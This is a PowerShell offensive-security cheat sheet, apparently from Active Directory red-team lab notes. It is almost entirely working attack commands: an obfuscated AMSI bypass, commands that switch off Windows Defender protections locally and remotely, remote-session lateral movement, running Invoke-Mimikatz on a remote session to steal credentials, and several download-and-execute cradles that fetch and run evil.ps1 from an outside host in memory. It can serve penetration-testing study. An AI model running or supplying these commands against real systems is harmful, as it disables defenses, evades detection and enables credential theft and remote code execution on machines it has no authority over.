##### AMSI Bypass Obscure
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

##### AMSI Bypass
Set-MpPreference -DisableIOAVProtection $true

##### AMSI Bypass remotely
Invoke-command - ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session <session>

##### Check for Contrained Language Mode
$ExecutionContext.SessionState.LanguageMode
 - (FullLanguage == Free as a bird; ConstrainedLanguage == Locked up)

##### Enumerate AppLocker (If Applocker is configured in "Allow mode" for scripts, PowerShell 5 automatically uses the Constrained Language Mode.)
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
 - (Looking for "Allows members of the Everyone group"  - Indicates that that folder can run scripts if you have control of a user in the Everyone group)

##### Disable WinDefender
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose 

##### PS Download into memory 
iex (iwr http://<url>/<file>.ps1 -UseBasicParsing)

##### Copy file from local machine to remote machine
Copy-Item .\<file> \\<fdqn of remote>\c$\'Program Files'

##### Quickly confirm you have remote access to a machine:
Invoke-Command -ScriptBlock {whoami;hostname} -ComputerName <Computer Name>
Invoke-Command -Filepath .\Invoke-Mimikatz.ps1 -Session $sesh

##### Create new PSSession to Computername
$sesh = New-PSSession -ComputerName <ComputerName>

##### Connect to Session by Session
Enter-PSSession -session <session name ie $sesh>

##### Connect to Session by ComputerName
Enter-PSSession -ComputerName <computer> 

#### WMI shorthand
gwmi -Class win32_computersystem -ComputerName dcorp- dc.dollarcorp.moneycorp.local


##### Download execute cradle
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1 ');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
PSv3 onwards - iex (iwr 'http://192.168.230.1/evil.ps1')
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1") $r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()

